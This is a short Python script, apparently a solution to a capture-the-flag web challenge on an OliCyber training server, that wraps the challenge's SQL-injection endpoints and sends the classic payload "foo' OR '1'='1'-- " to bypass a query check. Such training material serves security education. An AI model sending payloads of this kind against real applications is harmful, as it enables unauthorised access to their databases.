#!/usr/bin/env python3
"""
Here it is a basic SQL Logic Injection with OR '1'='1' parametr.
"""
import requests
import binascii
import time

class Injection:
    def __init__(self, host):
        self.session = requests.Session()
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token()

    def _refresh_csrf_token(self):
        response = self.session.get(self.base_url + 'get_token')
        response = response.json()
        self.token = response['token']

    def _do_raw_request(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query}
        return self.session.post(url, json = data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_request(url, query)
        return response['result'], response['sql_error']

    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_request(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_request(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_request(url, query)
        return response['result'], response['sql_error']

inj = Injection("http://web-17.challs.olicyber.it/")
response, error = inj.logic("foo' OR '1'='1'-- ")
print(response)


